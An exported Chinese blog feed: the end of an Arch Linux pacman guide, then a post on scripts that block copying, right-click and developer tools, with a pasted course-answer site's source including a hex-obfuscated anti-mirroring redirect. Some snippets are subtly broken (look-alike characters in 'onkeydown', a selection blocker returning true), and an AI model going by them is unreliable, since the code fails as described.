对于每一个在/etc/pacman.conf中指定的软件仓库， 这里都有一个一致的数据库。数据库文件夹里每个tar.gz文件都包含着一个仓库的软件包信息。例如which 包: 1234% tree which-2.20-6 which-2.20-6|-- depends`-- desc 这个 depends 项列出了该软件的依赖包， 而desc有该包的介绍，例如文件大小和MD5值 。 清理软件包缓存pacman 将下载的软件包保存在 /var/cache/pacman/pkg/ 并且不会自动移除旧的和未安装版本的软件包，因此需要手动清理，以免该文件夹过于庞大。 使用内建选项即可清除未安装软件包的缓存： 1$ pacman -Sc 警告: 仅在确定当前安装的软件包足够稳定且不需要降级)时才执行清理。pacman -Sc仅会保留软件包的当前有效版本，旧版本的软件包被清理后，只能从其他地方如 Arch Linux Archive (简体中文))中获取了。 pacman -Scc 可以清理所有缓存，但这样 pacman 在重装软件包时就只能重新下载了。除非空间不足，否则不应这么做。 由于以上种种局限，建议使用专门的脚本去处理清理哪些、清理多少缓存： pacman-contrib 提供的 paccache 命令默认会删除近3个版本前的软件包 1# paccache -r Tip: 可以使用 pacman hooks 自动执行清理，这里是参考示例。 也可以自己设置保留最近几个版本： 1# paccache -rk 1 清理所有未安装包的缓存文件，再此运行paccache: 1# paccache -ruk0 更多功能参见paccache -h。 paccache，还可以使用 Arch User Repository) 中的 pkgcachecleanAUR： 1# pkgcacheclean ，以及pacleanerAUR，这两个是未来的替代工具. 其它命令升级系统时安装其他软件包： 1$ pacman -Syu package_name1 package_name2 ... 下载包而不安装它： 1$ pacman -Sw package_name 安装一个本地包(不从源里下载）： 1$ pacman -U /path/to/package/package_name-version.pkg.tar.xz 要将本地包保存至缓存，可执行： 1$ pacman -U file://path/to/package/package_name-version.pkg.tar.xz 安装一个远程包（不在 pacman 配置的源里面）： 1$ pacman -U http://www.example.com/repo/example.pkg.tar.xz 要禁用 -S, -U 和 -R 动作，可以使用 -p 选项. pacman 会列出需要安装和删除的软件，并在执行动作前要求需要的权限。 安装原因pacman数据库按照软件包被安装的原因，将其分为两类： 指定安装包：通过pacman-S或者-U指令安装的软件包。 依赖包：指定安装包所依赖的软件包，尽管命令中未传入，但仍然会被安装。 当安装软件包时，可以把安装原因指定设为依赖: 1# pacman -S --asdeps package_name 但是当重新安装该软件包时，安装原因将会被设为软件包所默认的。 指定安装的软件包列表可用pacman -Qe, 已安装的依赖包可用pacman -Qd获取。 改变某个已安装软件包的安装原因，可以执行： 1# pacman -D --asdeps package_name 使用--asexplicit改为指定安装。 查询一个包含具体文件的包名同步文件数据库: 1# pacman -Fy 查询包含某个文件的包名，比如: 123456# pacman -Fs pacmancore/pacman 5.0.1-4 usr/bin/pacman usr/share/bash-completion/completions/pacmanextra/xscreensaver 5.36-1 usr/lib/xscreensaver/pacman 提示： 可以设置一个 crontab 或者 systemd timer 来定期同步文件信息数据库。 如果需要高级功能请安装 pkgfile，它使用一个单独的数据库来保存文件和它们所关联的软件包的信息。 ArchLinux的版本库里面包括： core-核心软件包 extra-其他常用软件 community-社区软件包，譬如Mysql等。 testing-正在测试阶段，还没有正式加入源的软件包。通常软件版本比较新，但是不是非常稳定 release-已经发布的软件包 unstable-非正式的软件包，可能包括以前版本的软件或者测试软件 因为Pacman的软件都是从源里面更新，因此在/etc/pacman.d里面配置这些软件源的地址。在/etc/pacman.d目录里面分别有上面几种软件类型对应的文件名，可以自己手工配置这些软件源的地址。]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ArchLinux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js_banned]]></title>
    <url>%2F2019%2F10%2F09%2Fjs-banned%2F</url>
    <content type="text"><![CDATA[序：原本想从网页上搞些网课答案下来，懒得用爬虫，便想直接复制粘贴更方便，结果遭遇了网页的复制和控制台禁用，本着求知的精神，就有了这篇文章。 网页中部分禁用及破解 利用js实现 禁用F12 12345678910&lt;script&gt;document.οnkeydοwn=function (e)&#123; var currKey=0,evt=e||window.event; currKey=evt.keyCode||evt.which||evt.charCode; if (currKey == 123) &#123; window.event.cancelBubble = true; window.event.returnValue = false; &#125; &#125;&lt;/script&gt; 123456789101112131415161718&lt;script&gt;var h = window.innerHeight,w=window.innerWidth;//禁用右键 （防止右键查看源代码）window.oncontextmenu=function()&#123;&lt;br&gt; return false;&lt;br&gt;&#125;//在本网页的任何键盘敲击事件都是无效操作 （防止F12和shift+ctrl+i调起开发者工具）window.onkeydown = window.onkeyup = window.onkeypress = function () &#123; window.event.returnValue = false; return false;&#125;//如果用户在工具栏调起开发者工具，那么判断浏览器的可视高度和可视宽度是否有改变，如有改变则关闭本页面window.onresize = function () &#123; if (h != window.innerHeight||w!=window.innerWidth)&#123; window.close(); window.location = "about:blank"; &#125;&#125;; &lt;/script&gt; 1234567891011121314151617181920212223242526272829&lt;script&gt;(document).keydown(function() &#123; return key(arguments[0])&#125;);function key(e) &#123; //f12 var keynum; if (window.event) &#123; keynum = e.keyCode; &#125; else if (e.which) &#123; keynum = e.which; &#125; if (keynum == 123) &#123; window.close(); return false; &#125; //ctrl+shift if (event.shiftKey&amp;&amp;event.ctrlKey) &#123; window.close(); return false; &#125;&#125;function Click() &#123; window.event.returnValue = false;&#125;document.oncontextmenu = Click;// 右击&lt;/script&gt; 禁用右键菜单 123&lt;script&gt;document.oncontextmenu = function()&#123;return false;&#125;&lt;/script&gt; 禁用文本选择 123&lt;script&gt;document.onselectstart = function()&#123;return true;&#125;&lt;/script&gt; 一个网页：当禁用js时无法打开，不禁用js，禁止复制、看源码、右键菜单、F12、文本选择 适合学习 原网页：http://www.gebidemengmianren.com/eryadaanfufei/198.html?btwaf=99961145 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623&lt;!DOCTYPE html&gt;&lt;html lang="zh-CN"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="Cache-Control" content="no-transform" /&gt; &lt;meta http-equiv="Cache-Control" content="no-siteapp" /&gt; &lt;meta name="applicable-device" content="pc,mobile"&gt; &lt;meta name="MobileOptimized" content="width" /&gt; &lt;meta name="HandheldFriendly" content="true" /&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt; &lt;noscript&gt; &lt;meta http-equiv="refresh" content="0; url=http://www.gebidemengmianren.com/my-plugins/no-js.html" /&gt;&lt;/noscript&gt; &lt;link type="text/css" media="all" href="http://www.gebidemengmianren.com/wp-content/cache/autoptimize/css/autoptimize_fbc8fb4f52ab77546156f37a7cb23309.css" rel="stylesheet" /&gt; &lt;title&gt;当代中国政府与政治2019 &amp;#8211; 隔壁的萌面人&lt;/title&gt; &lt;link rel='stylesheet' id='dashicons-css' href='http://www.gebidemengmianren.com/wp-includes/css/dashicons.min.css?ver=6f0a90e1258fc95d5c87f731d5ec4784' type='text/css' media='all' /&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'&gt;&lt;/script&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'&gt;&lt;/script&gt; &lt;!--[if lt IE 9]&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/themes/wellington/js/html5shiv.min.js?ver=3.7.3'&gt;&lt;/script&gt; &lt;![endif]--&gt; &lt;script type='text/javascript'&gt; var wellington_menu_title = "\u83dc\u5355"; &lt;/script&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/themes/wellington/js/navigation.js?ver=20160719'&gt;&lt;/script&gt; &lt;link rel='prev' title='密码保护：当代中国经济2019修正版' href='http://www.gebidemengmianren.com/eryadaanfufei/196.html' /&gt; &lt;link rel='next' title='密码保护：当政府遇上互联网2019' href='http://www.gebidemengmianren.com/eryadaanfufei/200.html' /&gt; &lt;link rel="canonical" href="http://www.gebidemengmianren.com/eryadaanfufei/198.html" /&gt; &lt;script type="text/javascript"&gt; document.ondragstart = function() &#123; return false &#125;; //for image document.oncontextmenu = function(e) &#123; return false &#125;; //for right click disable document.onkeydown = function(e) &#123; if (e.ctrlKey &amp;&amp; (e.keyCode === 65 || e.keyCode === 67 || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 80 || e.keyCode === 83 || e.keyCode === 85 || e.keyCode === 86 || e.keyCode === 117 )) &#123; return false; &#125; if (e.keyCode == 18 || e.keyCode == 123) &#123; return false &#125; &#125;; &lt;/script&gt; &lt;link rel="icon" href="http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g-150x150.jpg" sizes="32x32" /&gt; &lt;link rel="icon" href="http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg" sizes="192x192" /&gt; &lt;link rel="apple-touch-icon-precomposed" href="http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg" /&gt; &lt;meta name="msapplication-TileImage" content="http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg" /&gt;&lt;/head&gt;&lt;body class="post-template-default single single-post postid-198 single-format-standard post-layout-one-column" id='body'&gt; &lt;script type="text/javascript"&gt; ! function(t, e) &#123; "object" == typeof exports &amp;&amp; "object" == typeof module ? module.exports = e() : "function" == typeof define &amp;&amp; define.amd ? define([], e) : "object" == typeof exports ? exports.ClipboardJS = e() : t.ClipboardJS = e() &#125;(this, function() &#123; return function(t) &#123; function e(o) &#123; if (n[o]) return n[o].exports; var r = n[o] = &#123; i: o, l: !1, exports: &#123;&#125; &#125;; return t[o].call(r.exports, r, r.exports, e), r.l = !0, r.exports &#125; var n = &#123;&#125;; return e.m = t, e.c = n, e.i = function(t) &#123; return t &#125;, e.d = function(t, n, o) &#123; e.o(t, n) || Object.defineProperty(t, n, &#123; configurable: !1, enumerable: !0, get: o &#125;) &#125;, e.n = function(t) &#123; var n = t &amp;&amp; t.__esModule ? function() &#123; return t.default &#125; : function() &#123; return t &#125;; return e.d(n, "a", n), n &#125;, e.o = function(t, e) &#123; return Object.prototype.hasOwnProperty.call(t, e) &#125;, e.p = "", e(e.s = 3) &#125;([function(t, e, n) &#123; var o, r, i; ! function(a, c) &#123; r = [t, n(7)], o = c, void 0 !== (i = "function" == typeof o ? o.apply(e, r) : o) &amp;&amp; (t.exports = i) &#125;(0, function(t, e) &#123; "use strict"; function n(t, e) &#123; if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") &#125; var o = function(t) &#123; return t &amp;&amp; t.__esModule ? t : &#123; default: t &#125; &#125;(e), r = "function" == typeof Symbol &amp;&amp; "symbol" == typeof Symbol.iterator ? function(t) &#123; return typeof t &#125; : function(t) &#123; return t &amp;&amp; "function" == typeof Symbol &amp;&amp; t.constructor === Symbol &amp;&amp; t !== Symbol.prototype ? "symbol" : typeof t &#125;, i = function() &#123; function t(t, e) &#123; for (var n = 0; n &lt; e.length; n++) &#123; var o = e[n]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o &amp;&amp; (o.writable = !0), Object.defineProperty(t, o.key, o) &#125; &#125; return function(e, n, o) &#123; return n &amp;&amp; t(e.prototype, n), o &amp;&amp; t(e, o), e &#125; &#125;(), a = function() &#123; function t(e) &#123; n(this, t), this.resolveOptions(e), this.initSelection() &#125; return i(t, [&#123; key: "resolveOptions", value: function() &#123; var t = arguments.length &gt; 0 &amp;&amp; void 0 !== arguments[0] ? arguments[0] : &#123;&#125;; this.action = t.action, this.container = t.container, this.emitter = t.emitter, this.target = t.target, this.text = t.text, this.trigger = t.trigger, this.selectedText = "" &#125; &#125;, &#123; key: "initSelection", value: function() &#123; this.text ? this.selectFake() : this.target &amp;&amp; this.selectTarget() &#125; &#125;, &#123; key: "selectFake", value: function() &#123; var t = this, e = "rtl" == document.documentElement.getAttribute("dir"); this.removeFake(), this.fakeHandlerCallback = function() &#123; return t.removeFake() &#125;, this.fakeHandler = this.container.addEventListener("click", this.fakeHandlerCallback) || !0, this.fakeElem = document.createElement("textarea"), this.fakeElem.style.fontSize = "12pt", this.fakeElem.style.border = "0", this.fakeElem.style.padding = "0", this.fakeElem.style.margin = "0", this.fakeElem.style.position = "absolute", this.fakeElem.style[e ? "right" : "left"] = "-9999px"; var n = window.pageYOffset || document.documentElement.scrollTop; this.fakeElem.style.top = n + "px", this.fakeElem.setAttribute("readonly", ""), this.fakeElem.value = this.text, this.container.appendChild(this.fakeElem), this.selectedText = (0, o.default)(this.fakeElem), this.copyText() &#125; &#125;, &#123; key: "removeFake", value: function() &#123; this.fakeHandler &amp;&amp; (this.container.removeEventListener("click", this.fakeHandlerCallback), this.fakeHandler = null, this.fakeHandlerCallback = null), this.fakeElem &amp;&amp; (this.container.removeChild(this.fakeElem), this.fakeElem = null) &#125; &#125;, &#123; key: "selectTarget", value: function() &#123; this.selectedText = (0, o.default)(this.target), this.copyText() &#125; &#125;, &#123; key: "copyText", value: function() &#123; var t = void 0; try &#123; t = document.execCommand(this.action) &#125; catch (e) &#123; t = !1 &#125; this.handleResult(t) &#125; &#125;, &#123; key: "handleResult", value: function(t) &#123; this.emitter.emit(t ? "success" : "error", &#123; action: this.action, text: this.selectedText, trigger: this.trigger, clearSelection: this.clearSelection.bind(this) &#125;) &#125; &#125;, &#123; key: "clearSelection", value: function() &#123; this.trigger &amp;&amp; this.trigger.focus(), window.getSelection().removeAllRanges() &#125; &#125;, &#123; key: "destroy", value: function() &#123; this.removeFake() &#125; &#125;, &#123; key: "action", set: function() &#123; var t = arguments.length &gt; 0 &amp;&amp; void 0 !== arguments[0] ? arguments[0] : "copy"; if (this._action = t, "copy" !== this._action &amp;&amp; "cut" !== this._action) throw new Error('Invalid "action" value, use either "copy" or "cut"') &#125;, get: function() &#123; return this._action &#125; &#125;, &#123; key: "target", set: function(t) &#123; if (void 0 !== t) &#123; if (!t || "object" !== (void 0 === t ? "undefined" : r(t)) || 1 !== t.nodeType) throw new Error('Invalid "target" value, use a valid Element'); if ("copy" === this.action &amp;&amp; t.hasAttribute("disabled")) throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute'); if ("cut" === this.action &amp;&amp; (t.hasAttribute("readonly") || t.hasAttribute("disabled"))) throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes'); this._target = t &#125; &#125;, get: function() &#123; return this._target &#125; &#125;]), t &#125;(); t.exports = a &#125;) &#125;, function(t, e, n) &#123; function o(t, e, n) &#123; if (!t &amp;&amp; !e &amp;&amp; !n) throw new Error("Missing required arguments"); if (!c.string(e)) throw new TypeError("Second argument must be a String"); if (!c.fn(n)) throw new TypeError("Third argument must be a Function"); if (c.node(t)) return r(t, e, n); if (c.nodeList(t)) return i(t, e, n); if (c.string(t)) return a(t, e, n); throw new TypeError("First argument must be a String, HTMLElement, HTMLCollection, or NodeList") &#125; function r(t, e, n) &#123; return t.addEventListener(e, n), &#123; destroy: function() &#123; t.removeEventListener(e, n) &#125; &#125; &#125; function i(t, e, n) &#123; return Array.prototype.forEach.call(t, function(t) &#123; t.addEventListener(e, n) &#125;), &#123; destroy: function() &#123; Array.prototype.forEach.call(t, function(t) &#123; t.removeEventListener(e, n) &#125;) &#125; &#125; &#125; function a(t, e, n) &#123; return u(document.body, t, e, n) &#125; var c = n(6), u = n(5); t.exports = o &#125;, function(t, e) &#123; function n() &#123;&#125; n.prototype = &#123; on: function(t, e, n) &#123; var o = this.e || (this.e = &#123;&#125;); return (o[t] || (o[t] = [])).push(&#123; fn: e, ctx: n &#125;), this &#125;, once: function(t, e, n) &#123; function o() &#123; r.off(t, o), e.apply(n, arguments) &#125; var r = this; return o._ = e, this.on(t, o, n) &#125;, emit: function(t) &#123; var e = [].slice.call(arguments, 1), n = ((this.e || (this.e = &#123;&#125;))[t] || []).slice(), o = 0, r = n.length; for (o; o &lt; r; o++) n[o].fn.apply(n[o].ctx, e); return this &#125;, off: function(t, e) &#123; var n = this.e || (this.e = &#123;&#125;), o = n[t], r = []; if (o &amp;&amp; e) for (var i = 0, a = o.length; i &lt; a; i++) o[i].fn !== e &amp;&amp; o[i].fn._ !== e &amp;&amp; r.push(o[i]); return r.length ? n[t] = r : delete n[t], this &#125; &#125;, t.exports = n &#125;, function(t, e, n) &#123; var o, r, i; ! function(a, c) &#123; r = [t, n(0), n(2), n(1)], o = c, void 0 !== (i = "function" == typeof o ? o.apply(e, r) : o) &amp;&amp; (t.exports = i) &#125;(0, function(t, e, n, o) &#123; "use strict"; function r(t) &#123; return t &amp;&amp; t.__esModule ? t : &#123; default: t &#125; &#125; function i(t, e) &#123; if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") &#125; function a(t, e) &#123; if (!t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !e || "object" != typeof e &amp;&amp; "function" != typeof e ? t : e &#125; function c(t, e) &#123; if ("function" != typeof e &amp;&amp; null !== e) throw new TypeError("Super expression must either be null or a function, not " + typeof e); t.prototype = Object.create(e &amp;&amp; e.prototype, &#123; constructor: &#123; value: t, enumerable: !1, writable: !0, configurable: !0 &#125; &#125;), e &amp;&amp; (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e) &#125; function u(t, e) &#123; var n = "data-clipboard-" + t; if (e.hasAttribute(n)) return e.getAttribute(n) &#125; var l = r(e), s = r(n), f = r(o), d = "function" == typeof Symbol &amp;&amp; "symbol" == typeof Symbol.iterator ? function(t) &#123; return typeof t &#125; : function(t) &#123; return t &amp;&amp; "function" == typeof Symbol &amp;&amp; t.constructor === Symbol &amp;&amp; t !== Symbol.prototype ? "symbol" : typeof t &#125;, h = function() &#123; function t(t, e) &#123; for (var n = 0; n &lt; e.length; n++) &#123; var o = e[n]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o &amp;&amp; (o.writable = !0), Object.defineProperty(t, o.key, o) &#125; &#125; return function(e, n, o) &#123; return n &amp;&amp; t(e.prototype, n), o &amp;&amp; t(e, o), e &#125; &#125;(), p = function(t) &#123; function e(t, n) &#123; i(this, e); var o = a(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this)); return o.resolveOptions(n), o.listenClick(t), o &#125; return c(e, t), h(e, [&#123; key: "resolveOptions", value: function() &#123; var t = arguments.length &gt; 0 &amp;&amp; void 0 !== arguments[0] ? arguments[0] : &#123;&#125;; this.action = "function" == typeof t.action ? t.action : this.defaultAction, this.target = "function" == typeof t.target ? t.target : this.defaultTarget, this.text = "function" == typeof t.text ? t.text : this.defaultText, this.container = "object" === d(t.container) ? t.container : document.body &#125; &#125;, &#123; key: "listenClick", value: function(t) &#123; var e = this; this.listener = (0, f.default)(t, "click", function(t) &#123; return e.onClick(t) &#125;) &#125; &#125;, &#123; key: "onClick", value: function(t) &#123; var e = t.delegateTarget || t.currentTarget; this.clipboardAction &amp;&amp; (this.clipboardAction = null), this.clipboardAction = new l.default(&#123; action: this.action(e), target: this.target(e), text: this.text(e), container: this.container, trigger: e, emitter: this &#125;) &#125; &#125;, &#123; key: "defaultAction", value: function(t) &#123; return u("action", t) &#125; &#125;, &#123; key: "defaultTarget", value: function(t) &#123; var e = u("target", t); if (e) return document.querySelector(e) &#125; &#125;, &#123; key: "defaultText", value: function(t) &#123; return u("text", t) &#125; &#125;, &#123; key: "destroy", value: function() &#123; this.listener.destroy(), this.clipboardAction &amp;&amp; (this.clipboardAction.destroy(), this.clipboardAction = null) &#125; &#125;], [&#123; key: "isSupported", value: function() &#123; var t = arguments.length &gt; 0 &amp;&amp; void 0 !== arguments[0] ? arguments[0] : ["copy", "cut"], e = "string" == typeof t ? [t] : t, n = !!document.queryCommandSupported; return e.forEach(function(t) &#123; n = n &amp;&amp; !!document.queryCommandSupported(t) &#125;), n &#125; &#125;]), e &#125;(s.default); t.exports = p &#125;) &#125;, function(t, e) &#123; function n(t, e) &#123; for (; t &amp;&amp; t.nodeType !== o;) &#123; if ("function" == typeof t.matches &amp;&amp; t.matches(e)) return t; t = t.parentNode &#125; &#125; var o = 9; if ("undefined" != typeof Element &amp;&amp; !Element.prototype.matches) &#123; var r = Element.prototype; r.matches = r.matchesSelector || r.mozMatchesSelector || r.msMatchesSelector || r.oMatchesSelector || r.webkitMatchesSelector &#125; t.exports = n &#125;, function(t, e, n) &#123; function o(t, e, n, o, r) &#123; var a = i.apply(this, arguments); return t.addEventListener(n, a, r), &#123; destroy: function() &#123; t.removeEventListener(n, a, r) &#125; &#125; &#125; function r(t, e, n, r, i) &#123; return "function" == typeof t.addEventListener ? o.apply(null, arguments) : "function" == typeof n ? o.bind(null, document).apply(null, arguments) : ("string" == typeof t &amp;&amp; (t = document.querySelectorAll(t)), Array.prototype.map.call( t, function(t) &#123; return o(t, e, n, r, i) &#125;)) &#125; function i(t, e, n, o) &#123; return function(n) &#123; n.delegateTarget = a(n.target, e), n.delegateTarget &amp;&amp; o.call(t, n) &#125; &#125; var a = n(4); t.exports = r &#125;, function(t, e) &#123; e.node = function(t) &#123; return void 0 !== t &amp;&amp; t instanceof HTMLElement &amp;&amp; 1 === t.nodeType &#125;, e.nodeList = function(t) &#123; var n = Object.prototype.toString.call(t); return void 0 !== t &amp;&amp; ("[object NodeList]" === n || "[object HTMLCollection]" === n) &amp;&amp; "length" in t &amp;&amp; (0 === t.length || e.node(t[0])) &#125;, e.string = function(t) &#123; return "string" == typeof t || t instanceof String &#125;, e.fn = function(t) &#123; return "[object Function]" === Object.prototype.toString.call(t) &#125; &#125;, function(t, e) &#123; function n(t) &#123; var e; if ("SELECT" === t.nodeName) t.focus(), e = t.value; else if ("INPUT" === t.nodeName || "TEXTAREA" === t.nodeName) &#123; var n = t.hasAttribute("readonly"); n || t.setAttribute("readonly", ""), t.select(), t.setSelectionRange(0, t.value.length), n || t.removeAttribute("readonly"), e = t.value &#125; else &#123; t.hasAttribute("contenteditable") &amp;&amp; t.focus(); var o = window.getSelection(), r = document.createRange(); r.selectNodeContents(t), o.removeAllRanges(), o.addRange(r), e = o.toString() &#125; return e &#125; t.exports = n &#125;]) &#125;); &lt;/script&gt; &lt;script&gt; var clipboard = new ClipboardJS('.entry-content', &#123; text: function() &#123; //return ''; &#125; &#125;); clipboard.on('success', function(e) &#123; //console.log(e); &#125;); clipboard.on('error', function(e) &#123; //console.log(e); &#125;); &lt;/script&gt; &lt;script type="text/javascript"&gt; str = "\x77\x77\x77\x2e\x67\x65\x62\x69\x64\x65\x6d\x65\x6e\x67\x6d\x69\x61\x6e\x72\x65\x6e\x2e\x63\x6f\x6d"; if (window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x68\x6f\x73\x74"] != str) &#123; location["\x68\x72\x65\x66"] = location["\x68\x72\x65\x66"]["\x72\x65\x70\x6c\x61\x63\x65"](window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x68\x6f\x73\x74"], str); &#125; &lt;/script&gt; &lt;div id="header-top" class="header-bar-wrap"&gt;&lt;/div&gt; &lt;div id="page" class="hfeed site"&gt; &lt;a class="skip-link screen-reader-text" href="#content"&gt;Skip to content&lt;/a&gt; &lt;header id="masthead" class="site-header clearfix" role="banner"&gt; &lt;div class="header-main container clearfix"&gt; &lt;div id="logo" class="site-branding clearfix"&gt; &lt;p class="site-title"&gt;&lt;a href="http://www.gebidemengmianren.com/" rel="home"&gt;隔壁的萌面人&lt;/a&gt;&lt;/p&gt; &lt;p class="site-description"&gt;最专业的大学资料分享平台&lt;/p&gt; &lt;/div&gt; &lt;div class="header-widgets clearfix"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div id="main-navigation-wrap" class="primary-navigation-wrap"&gt; &lt;nav id="main-navigation" class="primary-navigation navigation container clearfix" role="navigation"&gt; &lt;ul id="menu-menu-1" class="main-navigation-menu"&gt; &lt;li id="menu-item-2987" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2987"&gt;&lt;a href="http://www.gebidemengmianren.com/question-and-answer"&gt;常见问题解答&lt;/a&gt;&lt;/li&gt; &lt;li id="menu-item-2988" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2988"&gt;&lt;a href="http://www.gebidemengmianren.com/category/zhihuishu"&gt;智慧树&lt;/a&gt;&lt;/li&gt; &lt;li id="menu-item-2989" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-2989"&gt;&lt;a href="http://www.gebidemengmianren.com/category/eryadaanfufei"&gt;尔雅&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;/div&gt; &lt;/header&gt; &lt;div id="content" class="site-content container clearfix"&gt; &lt;section id="primary" class="content-single content-area"&gt; &lt;main id="main" class="site-main" role="main"&gt; &lt;article id="post-198" class="post-198 post type-post status-publish format-standard post-password-protected hentry category-eryadaanfufei"&gt; &lt;header class="entry-header"&gt; &lt;div class="entry-meta"&gt;&lt;span class="meta-date"&gt;&lt;a href="http://www.gebidemengmianren.com/eryadaanfufei/198.html" title="下午10:02" rel="bookmark"&gt;&lt;time class="entry-date published updated" datetime="2019-03-20T22:02:27+00:00"&gt;2019年3月20日&lt;/time&gt;&lt;/a&gt;&lt;/span&gt;&lt;span class="meta-author"&gt; &lt;span class="author vcard"&gt;&lt;a class="url fn n" href="http://www.gebidemengmianren.com/author/meng" title="View all posts by gebilaowang" rel="author"&gt;gebilaowang&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt; &lt;h1 class="entry-title"&gt;密码保护：当代中国政府与政治2019&lt;/h1&gt; &lt;/header&gt; &lt;footer class="entry-footer"&gt; &lt;div class="entry-categories clearfix"&gt; &lt;span class="meta-categories"&gt; &lt;a href="http://www.gebidemengmianren.com/category/eryadaanfufei" rel="category tag"&gt;尔雅&lt;/a&gt; &lt;/span&gt;&lt;/div&gt; &lt;nav class="navigation post-navigation" role="navigation"&gt; &lt;h2 class="screen-reader-text"&gt;文章导航&lt;/h2&gt; &lt;div class="nav-links"&gt; &lt;div class="nav-previous"&gt;&lt;a href="http://www.gebidemengmianren.com/eryadaanfufei/196.html" rel="prev"&gt;&lt;span class="screen-reader-text"&gt;Previous Post:&lt;/span&gt;当代中国经济2019修正版&lt;/a&gt;&lt;/div&gt; &lt;div class="nav-next"&gt;&lt;a href="http://www.gebidemengmianren.com/eryadaanfufei/200.html" rel="next"&gt;&lt;span class="screen-reader-text"&gt;Next Post:&lt;/span&gt;当政府遇上互联网2019&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/footer&gt; &lt;/article&gt; &lt;div id="comments" class="comments-area"&gt;&lt;/div&gt; &lt;/main&gt; &lt;/section&gt; &lt;section id="secondary" class="sidebar widget-area clearfix sidebar-my-flag" role="complementary"&gt; &lt;aside id="search-6" class="widget widget_search clearfix"&gt; &lt;form role="search" method="get" class="search-form" action="http://www.gebidemengmianren.com/"&gt; &lt;label&gt; &lt;span class="screen-reader-text"&gt;Search for:&lt;/span&gt; &lt;input type="search" class="search-field" placeholder="搜索 &amp;hellip;" value="" name="s" title="Search for:" /&gt; &lt;/label&gt; &lt;button type="submit" class="search-submit"&gt; &lt;span class="genericon-search"&gt;&lt;/span&gt; &lt;span class="screen-reader-text"&gt;Search&lt;/span&gt; &lt;/button&gt;&lt;/form&gt; &lt;/aside&gt; &lt;/section&gt; &lt;/div&gt; &lt;a href="http://www.gebidemengmianren.com/question-and-answer" target="_blank"&gt; &lt;div class="livechat-girl animated"&gt; &lt;img class="girl" src="http://www.gebidemengmianren.com/kefu/images/en_3.png"&gt; &lt;div class="livechat-hint rd-notice-tooltip rd-notice-type-success rd-notice-position-left single-line show_hint"&gt; &lt;div class="rd-notice-content"&gt; 我来帮您！&lt;/div&gt; &lt;/div&gt; &lt;div class="animated-circles"&gt; &lt;div class="circle c-1"&gt;&lt;/div&gt; &lt;div class="circle c-2"&gt;&lt;/div&gt; &lt;div class="circle c-3"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/a&gt; &lt;link href="http://www.xuexianswer.com/kefu/css/css.css" rel="stylesheet" media="screen"&gt; &lt;script type="text/javascript" src="http://www.xuexianswer.com/kefu/js/jquery-1.7.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="http://www.xuexianswer.com/kefu/js/kefu.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="http://www.gebidemengmianren.com/kefu/js/en_3.js"&gt;&lt;/script&gt; &lt;div id="footer" class="footer-wrap"&gt; &lt;footer id="colophon" class="site-footer container clearfix" role="contentinfo"&gt; &lt;div align="center"&gt; &lt;a href="http://www.gebidemengmianren.com/" style='text-decoration:none; 